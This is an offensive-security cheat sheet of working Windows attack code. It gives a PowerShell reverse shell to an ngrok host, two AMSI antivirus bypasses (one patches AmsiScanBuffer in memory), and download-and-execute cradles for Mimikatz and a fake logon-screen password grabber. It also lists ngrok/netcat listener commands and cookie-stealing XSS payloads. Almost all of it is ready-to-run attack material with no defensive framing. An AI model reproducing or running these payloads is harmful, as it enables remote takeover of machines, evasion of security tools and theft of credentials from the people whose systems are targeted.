# windows Rerverse shell
```php
$cthulhu = New-Object System.Net.Sockets.TCPClient('0.tcp.ngrok.io',19021 );$tntcl = $cthulhu.GetStream();[byte[]]$cult = 0..65535|% {0};while(($i = $tntcl.Read($cult, 0, $cult.Length)) -ne 0) {;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($cult,0, $i);$ex = (iex $d 2>&1 | Out-String );$ex2 = $ex + 'CF ' + (pwd).Path + '> '; $shog =([text.encoding]::ASCII).GetBytes($ex2);$tntcl.write($shog,0,$shog.Length); $tntcl.Flush()};

```
------------------------------------------------------

# AMSI BYPASS

```php
$forsec = 'System.Management.Automation.A';$yfd = 'si';$ted = 'Ut' + 'ils'
$astute = [Ref].Assembly.GEtTYpe(('{0}m{1}{2}' -f $forsec,$yfd,$ted))
$onlysecthings =$astute.Getfield(('am{0}InitFailed' -f $yfd),'NonPu' + 'blic' + ',St' + 'atic')
$onlysecthings.SetVALuE($null,$true)
```
------------------------------------------------------------
# ULTIMATE BYPASS

```php
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

----------------------------------------------------------------------------------------

# invoke pattern to download into memory 
```php
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1')
```
# invoke important ps1 github

**MIMIKATZ**

```php
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1')
```
**LOGIN SCREEN PASSWORD GRABBER**

```php
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-FakeLogonScreen.ps1')
```

-----------------------------------------------------------------------------------------------

    ngrok TCP PORT for rev listening 

    ngrok http for http service forwarding 


---------------------------------------------------------------------------------------------------

    ngrok tcp 1234
    nc -nvlp 1234

------------------------------------------------------------------------------------------------------

    tmate 

------------------------------------------------------------------------------------------------

# XSS Paylaods

```html
t3_u9po1l%2520onmouseover=alert(document.domain)%2520y=/t1_i5sxroa

javascript:alert(document.cookie)

"><img src=x onerror=prompt(document.cookie);> 

"><img src=x onerror=alert(1)>

<h1>Testing TG</h1>
```

